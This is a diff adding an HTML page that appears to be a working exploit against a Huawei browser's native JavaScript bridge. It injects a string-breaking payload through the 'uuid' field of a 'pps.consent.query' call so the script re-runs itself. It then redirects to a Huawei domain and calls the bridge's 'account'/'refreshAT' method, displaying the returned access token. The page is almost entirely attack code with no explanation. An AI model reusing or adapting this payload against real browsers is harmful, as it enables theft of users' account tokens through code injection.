@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html lang="en">
+<h1>AAAAAAAAAAAAAAAAAAAAA</h1>
+<head>
+    <meta charset="UTF-8">
+    <title>HW</title>
+    <script type="text/javascript">
+        window.noJump = true;
+        window.current = location.href;
+        function crazy(){
+            if(window.noJump){
+                var funcString = crazy.toString().replaceAll('\n','');
+                var funcCalling = '(()=>{' + funcString + ';crazy();})()';
+                var payload = '\'},\'*\');}}};' + funcCalling + '//';
+                var content = {};
+                var data = {'content': JSON.stringify(content), 'url': 'https://www.baidu.com', 'webid':'deadbeef', 'top':false, 'uuid': payload};
+                window._HwJSBridge.invokeAsync('pps.consent.query',  JSON.stringify(data), '123');
+            }else{
+                setTimeout(()=>{
+                    window.hwbr = window.hwbr || {};
+                    window.hwbr.callbackFromNative = function(a, b, c, d, e){if(a=='zdccctest') {alert(d.toString())}};
+                    window._hwbrNative.invoke('account', 'refreshAT', 'zdccctest', '["123", "123"]', 10);
+                }, 500);
+            }
+        }
+        crazy();
+        location.href="https://feeds-drcn.cloud.huawei.com.cn/landingpage/latest?docid=1051253f3e903d7ffbd11fc014b09f7240dc0f6&to_app=hwbrowser&dy_scenario=relate&tn=fdb43cc7d95113d61182a46e5027c537c4e9b1c2dbcc7503bab085653b6c181a&channel=HW_FACA_ZH&ctype=news&cpid=666&r=CN#/";
+        /*function test() {
+            window._HwJSBridge.invokeAsync('pps.consent.query', "aaaa", "bbbbb");
+        }*/
+    </script>
+</head>
+</html>
